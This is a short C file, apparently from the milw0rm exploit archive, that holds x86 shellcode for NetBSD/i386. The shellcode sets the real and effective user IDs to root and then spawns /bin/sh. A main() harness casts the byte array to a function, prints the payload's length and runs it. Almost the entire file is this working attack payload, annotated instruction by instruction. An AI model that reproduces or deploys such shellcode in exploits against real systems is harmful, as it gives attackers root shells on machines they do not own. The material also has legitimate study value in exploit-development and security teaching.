/*
 *  minervini at neuralnoise dot com (c) 2005
 *  NetBSD/i386 2.0, setreuid(0, 0); execve("/bin//sh", ..., NULL);
 */

#include <sys/types.h>
#include <stdio.h>
#include <string.h>

char scode[] =
  "\x31\xc0"             // xor    %eax,%eax
  "\x50"                 // push   %eax
  "\x50"                 // push   %eax
  "\x50"                 // push   %eax
  "\x34\x7e"             // xor    $0x7e,%al
  "\xcd\x80"             // int    $0x80
  "\x58"                 // pop    %eax
  "\x68\x2f\x2f\x73\x68" // push   $0x68732f2f
  "\x68\x2f\x62\x69\x6e" // push   $0x6e69622f
  "\x89\xe3"             // mov    %esp,%ebx
  "\x50"                 // push   %eax
  "\x54"                 // push   %esp
  "\x53"                 // push   %ebx
  "\x50"                 // push   %eax
  "\x34\x3b"             // xor    $0x3b,%al
  "\xcd\x80";            // int    $0x80

int main() {
   void (*code) () = (void *) scode;
   printf("length: %d\n", strlen(scode));
   code();
   return (0);
}

// milw0rm.com [2005-11-30]